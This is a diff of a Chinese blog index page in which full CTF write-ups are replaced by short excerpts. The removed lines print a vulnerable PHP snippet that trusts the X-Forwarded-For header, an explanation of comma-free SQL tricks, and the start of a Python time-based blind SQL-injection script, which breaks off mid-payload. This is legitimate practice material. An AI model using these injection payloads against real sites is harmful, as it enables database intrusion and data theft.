@@ -177,7 +177,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/Referer/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/X-Forwarded-For/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -191,7 +191,7 @@
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
           
-            <a href="/2020/02/03/Referer/" class="post-title-link" itemprop="url">Referer</a>
+            <a href="/2020/02/03/X-Forwarded-For/" class="post-title-link" itemprop="url">X-Forwarded-For</a>
         </h1>
 
         <div class="post-meta">
@@ -202,7 +202,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2020-02-03 00:00:00 / 修改时间：16:06:31" itemprop="dateCreated datePublished" datetime="2020-02-03T00:00:00+08:00">2020-02-03</time>
+              <time title="创建时间：2020-02-03 00:00:00 / 修改时间：15:52:29" itemprop="dateCreated datePublished" datetime="2020-02-03T00:00:00+08:00">2020-02-03</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -227,10 +227,10 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p><strong>HTTP Referer</strong>是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。比如从我主页上链接到一个朋友那里，他的服务器就能够从HTTP Referer中统计出每天有多少用户点击我主页上的链接访问他的网站。</p>
+          <p>X-Forwarded-For<br>简称<strong>XFF头</strong>，是一个扩展头，它代表客户端也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项（百度百科：用来识别通过HTTP代理或负载均衡方式连接到Web服务器的<strong>客户端最原始的IP地址</strong>的<strong>HTTP请求头字段</strong>）。</p>
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/2020/02/03/Referer/#more" rel="contents">
+              <a class="btn" href="/2020/02/03/X-Forwarded-For/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -283,7 +283,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2020-02-03 00:00:00 / 修改时间：15:59:12" itemprop="dateCreated datePublished" datetime="2020-02-03T00:00:00+08:00">2020-02-03</time>
+              <time title="创建时间：2020-02-03 00:00:00 / 修改时间：17:06:40" itemprop="dateCreated datePublished" datetime="2020-02-03T00:00:00+08:00">2020-02-03</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -308,24 +308,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <a id="more"></a>
-
-<h1 id="gakki"><a href="#gakki" class="headerlink" title="gakki"></a>gakki</h1><p>下载压缩包之后是一张gakki的图片，<br><img src="https://img-blog.csdnimg.cn/2020013115185922.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_14,color_FFFFFF,t_70" width="300" height="300" align=center><br>foremost一下，得到一个压缩包，包里有flag.txt，但是需要密码才能打开。尝试数字爆破，得到密码8864，打开之后得到一串奇奇怪怪的字符，<br><img src="https://img-blog.csdnimg.cn/20200131154247216.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_14,color_FFFFFF,t_70" width="500" height="380"><br>看了大佬的wp，对于这种无规律的字符集要尝试字频统计，附上字频统计exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">alphabet = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =&#123;&#125;[]"</span></span><br><span class="line">f = open(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>)</span><br><span class="line">data = f.read()</span><br><span class="line">result = &#123;d:<span class="number">0</span> <span class="keyword">for</span> d <span class="keyword">in</span> alphabet&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sort_by_value</span><span class="params">(d)</span>:</span></span><br><span class="line">    items = d.items()</span><br><span class="line">    backitems = [[v[<span class="number">1</span>],v[<span class="number">0</span>]] <span class="keyword">for</span> v <span class="keyword">in</span> items]</span><br><span class="line">    backitems.sort(reverse=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> [ backitems[i][<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(backitems))]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">for</span> alpha <span class="keyword">in</span> alphabet:</span><br><span class="line">        <span class="keyword">if</span> d == alpha:</span><br><span class="line">            result[alpha] = result[alpha] + <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">print(sort_by_value(result))</span><br></pre></td></tr></table></figure>
-<p>跑一遍就能得到flag了。<br><img src="https://img-blog.csdnimg.cn/20200131160731725.png" alt="在这里插入图片描述"></p>
-<h1 id="SXMgdGhpcyBiYXNlPw"><a href="#SXMgdGhpcyBiYXNlPw" class="headerlink" title="SXMgdGhpcyBiYXNlPw=="></a>SXMgdGhpcyBiYXNlPw==</h1><p>题目base64解密一下，得到<code>Is this base?</code><br>下载文件得到一个压缩包，里面是flag.txt，打开一看是base64字符，写脚本跑一下，得到<code>b&#39;Cette nuit,\nIntenable insomnie,\n&#39;</code>。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">file=open(<span class="string">'D:/flag.txt'</span>,<span class="string">'rb'</span>)</span><br><span class="line">result=base64.b64decode(file.read())</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
-<p>或者直接ctrl +C到解码网站，得到的基本一样：<br><img src="https://img-blog.csdnimg.cn/20200131174737172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>把那串字符百度一下，是杀人狂想曲的歌词<br><img src="https://img-blog.csdnimg.cn/20200131174823784.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_10,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>多行解密一下，得到果然是歌词，不过有些地方因为编码不同乱码了，</p>
-<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Cette</span> <span class="string">nuit,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Intenable</span> <span class="string">insomnie,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">La</span> <span class="string">folie me guette,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Je</span> <span class="string">suis ce que je fuis</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Je</span> <span class="string">subis,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Cette</span> <span class="string">cacophonie,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Qui</span> <span class="string">me scie la t锚te,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Assommante</span> <span class="string">harmonie,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Elle</span> <span class="string">me dit,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Tu</span> <span class="string">paieras tes delits,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Quoi</span> <span class="string">qu'il advienne,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">On</span> <span class="string">tra卯ne ses cha卯nes,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Ses</span> <span class="string">peines,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Je</span> <span class="string">voue mes nuits,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">A</span> <span class="string">l'assasymphonie,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Aux</span> <span class="string">requiems,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Tuant</span> <span class="string">par depit,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Ce</span> <span class="string">que je seme,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Je</span> <span class="string">voue mes nuits,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">A</span> <span class="string">l'assasymphonie,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Et</span> <span class="string">aux blasphemes,</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">J'avoue</span> <span class="string">je maudis,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Tous</span> <span class="string">ceux qui s'aiment,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">L'ennemi,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Tapi</span> <span class="string">dans mon esprit,</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">F锚te</span> <span class="string">mes defaites,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Sans</span> <span class="string">repit me defie,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Je</span> <span class="string">renie,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">La</span> <span class="string">fatale heresie,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Qui</span> <span class="string">ronge mon 锚tre,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Je</span> <span class="string">veux rena卯tre,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Rena卯tre,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Je</span> <span class="string">voue mes nuits,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">A</span> <span class="string">l'assasymphonie,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Aux</span> <span class="string">requiems,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Tuant</span> <span class="string">par depit,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Ce</span> <span class="string">que je seme,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Je</span> <span class="string">voue mes nuits,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">A</span> <span class="string">l'assasymphonie,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Et</span> <span class="string">aux blasphemes,</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">J'avoue</span> <span class="string">je maudis,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Tous</span> <span class="string">ceux qui s'aiment,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Pleurent</span> <span class="string">les violons de ma vie,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">La</span> <span class="string">violence de mes envies,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Siphonnee</span> <span class="string">symphonie,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Deconcertant</span> <span class="string">concerto,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Je</span> <span class="string">joue sans toucher le Do,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Mon</span> <span class="string">talent sonne faux,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Je</span> <span class="string">noie mon ennui,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Dans</span> <span class="string">la melomanie,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Je</span> <span class="string">tue mes phobies,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Dans</span> <span class="string">la desharmonie,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Je</span> <span class="string">voue mes nuits,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">A</span> <span class="string">l'assasymphonie,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Aux</span> <span class="string">requiems,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Tuant</span> <span class="string">par depit,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Ce</span> <span class="string">que je seme,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Je</span> <span class="string">voue mes nuits,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">A</span> <span class="string">l'assasymphonie,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Et</span> <span class="string">aux blasphemes,</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">J'avoue</span> <span class="string">je maudis,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Tous</span> <span class="string">ceux qui s'aiment,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Je</span> <span class="string">voue mes nuits,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">A</span> <span class="string">l'assasymphonie (l'assasymphonie),</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">J'avoue</span> <span class="string">je maudis,</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Tous</span> <span class="string">ceux qui s'aiment</span></span><br></pre></td></tr></table></figure>
-<p>考虑到是base64隐写，<br><img src="https://img-blog.csdnimg.cn/20200131180418882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_14,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>base64隐写：<br>base64是将3个8比特转换成4个6比特，最小的转换单位是24比特（6和8最小公倍数）</p>
-<p>因此如果原文内容不足三字节，有一部分比特解码时候不需要，但会组成编码后的某个字符。</p>
-<p>比如上图A的 0100 0001 被 base64 识别为 0100 0001 0000 然而最后四个比特解密时无<br>用。换句话说 0100 0001 0000 和0100 0001 1111 对应的原文都是 A ，因此可以使用这四个比特进行隐写。</p>
-<p>简单来说，就是base64编码时不是正好占到3字节，当没有占到3字节的时候，我们就可以利用最后的几个bit来隐藏信息，同时也不影响原本的编码。</p>
-<p>附上一篇关于base64隐写的文章：<a href="https://www.tr0y.wang/2017/06/14/Base64steg/index.html" target="_blank" rel="noopener">https://www.tr0y.wang/2017/06/14/Base64steg/index.html</a></p>
-<p>脚本跑一下得到flag。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">b64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    bin_str = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        stegb64 = <span class="string">''</span>.join(line.split())</span><br><span class="line">        rowb64 =  <span class="string">''</span>.join(stegb64.decode(<span class="string">'base64'</span>).encode(<span class="string">'base64'</span>).split())</span><br><span class="line">        offset = abs(b64chars.index(stegb64.replace(<span class="string">'='</span>,<span class="string">''</span>)[<span class="number">-1</span>])-b64chars.index(rowb64.replace(<span class="string">'='</span>,<span class="string">''</span>)[<span class="number">-1</span>]))</span><br><span class="line">        equalnum = stegb64.count(<span class="string">'='</span>) <span class="comment">#no equalnum no offset</span></span><br><span class="line">        <span class="keyword">if</span> equalnum:</span><br><span class="line">            bin_str += bin(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">''</span>.join([chr(int(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(bin_str), <span class="number">8</span>)]) <span class="comment">#8 位一组</span></span><br></pre></td></tr></table></figure>
-
-
+          <p>BUU misc刷题~~</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/02/03/BUU%20misc%EF%BC%88GXYCTF2019%EF%BC%89/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -373,7 +364,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2020-02-03 00:00:00 / 修改时间：15:59:51" itemprop="dateCreated datePublished" datetime="2020-02-03T00:00:00+08:00">2020-02-03</time>
+              <time title="创建时间：2020-02-03 00:00:00 / 修改时间：17:09:13" itemprop="dateCreated datePublished" datetime="2020-02-03T00:00:00+08:00">2020-02-03</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -398,14 +389,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <a id="more"></a>
-<p>题目表面上给的是一张jpg图片，但是binwalk一下，里面有压缩包，binwalk snake.jpg -e解压一下，<br><img src="https://img-blog.csdnimg.cn/20190813115300135.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>里面有两个文件，一个key，一个cipher，打开key，有一串base64字符，</p>
-<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">V<span class="number">2</span>hhdCBpcyBOaW<span class="symbol">NraSBNaW5</span>haidzIGZhd<span class="name">m9</span>yaXRlIH<span class="symbol">NvbmcgdGhhdCByZWZlcnMgdG8</span>gc<span class="number">25</span>ha<span class="number">2</span>VzPwo=</span><br></pre></td></tr></table></figure>
-
-<p>解码之后，得到：</p>
-<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What <span class="keyword">is</span> Nicki Minaj's favorite song <span class="keyword">that</span> refers <span class="keyword">to</span> snakes?</span><br></pre></td></tr></table></figure>
-<p>百度Nicki Minaj关于蛇的歌，当然看了一些大佬的博客，知道了指的是anaconda，就是cipher解密的私钥了。<br><img src="https://img-blog.csdnimg.cn/20190813115901369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看完key之后，打开chipher，并不能打开。看了大佬的博客才知道，对于蛇这个名词，在英语中还有一个翻译：Serpent。<br>Serpent是一个加密算法，具体算法见大佬博客<a href="https://blog.csdn.net/douqingl/article/details/50256931" target="_blank" rel="noopener">https://blog.csdn.net/douqingl/article/details/50256931</a><br>于是，用该算法对chipher进行解密，拿到flag，<a href="http://serpent.online-domain-tools.com/" target="_blank" rel="noopener">解密网站</a><br><img src="https://img-blog.csdnimg.cn/20190813142355629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-
+          <p>BUU Snake~~</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/02/03/BUUCTF%20snake%EF%BC%88%E5%AE%9E%E9%AA%8C%E5%90%A7Snake%EF%BC%89/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -453,7 +445,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2020-02-03 00:00:00 / 修改时间：15:37:40" itemprop="dateCreated datePublished" datetime="2020-02-03T00:00:00+08:00">2020-02-03</time>
+              <time title="创建时间：2020-02-03 00:00:00 / 修改时间：17:07:10" itemprop="dateCreated datePublished" datetime="2020-02-03T00:00:00+08:00">2020-02-03</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -478,361 +470,10 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <a id="more"></a>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span><span class="params">()</span></span>&#123;</span><br><span class="line">$ip = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr = explode(<span class="string">','</span>, $ip);</span><br><span class="line"><span class="keyword">return</span> $ip_arr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host=<span class="string">"localhost"</span>;</span><br><span class="line">$user=<span class="string">""</span>;</span><br><span class="line">$pass=<span class="string">""</span>;</span><br><span class="line">$db=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$connect = mysql_connect($host, $user, $pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to connect"</span>);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to select database"</span>);</span><br><span class="line"></span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'your ip is :'</span>.$ip;</span><br><span class="line">$sql=<span class="string">"insert into client_ip (ip) values ('$ip')"</span>;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure>
-<p>题目给了源码，简单分析下知道是读取HTTP头部的X_FORWARDED_FOR作为ip，在将其传给$ip前，用explode()函数以,为分割符分割并取结果数组的第一项。</p>
-<p>要进行注入的语句是：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into client_ip (ip) values (<span class="string">'$ip'</span>)</span><br></pre></td></tr></table></figure>
-<p>很明显，这是一道过滤了逗号的xff注入题目，由于返回结果无有效回显，可以进行时间盲注。<br>后面的就不会了55555</p>
-<p>下面是大佬的wp:</p>
-<p>我看到网络上有些writeup在猜解flag时直接得知了它在flag表的flag列，也许是一种巧妙的猜测？猜不到就只能通过information_schema数据库慢慢猜解表和列了。</p>
-<p>一些知识点：</p>
-<ol>
-<li>元数据在sql注入中的应用，即informations_schema库中的SCHEMATA、TABLES、COLUMNS表中存储着数据库系统中数据库、表、列的信息。</li>
-<li>MySQL中的case when语句。进行时间盲注时自然想到的是if(cond,expr1,expr2)语句，但是此处对逗号进行了过滤，因此采用case when 代替if进行时间盲注。</li>
-<li>substr截取字符串的非逗号形式。进行时间盲注要穷举字符，需要通过substr截取字符串，但是常用的形式substr([str],[from],[len])含有逗号，因此采用substr([str] from [from] for [len])来代替，比如substr(‘asd’,1,2)与substr(‘asd’ from 1 for 2)都获得’as’。</li>
-<li>limit的非逗号形式。有时一条语句可以查询出多个结果，进行一一猜解时要每次限制查询出一条结果，在不使用逗号时，用limit [len] offset [offset] 代替 limit [offset],[len]。</li>
-</ol>
-<p>下面是猜解代码，可以通过改写为多线程/进程提高网络io速度，可以通过提高sleep及timeout时间提高准确度。<br>猜解库和表：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">dic=<span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUZWXYZ_'</span></span><br><span class="line"><span class="comment">#猜解数据库名称的payload</span></span><br><span class="line">payload_db = <span class="string">"1'+(select case when (substr(database() from &#123;0&#125; for 1)='&#123;1&#125;') then sleep(6) else 1 end)+'1"</span></span><br><span class="line"><span class="comment">#猜解表数量的payload</span></span><br><span class="line">payload_tb_num = <span class="string">"1'+(select case when (select count(*) from information_schema.TABLES where 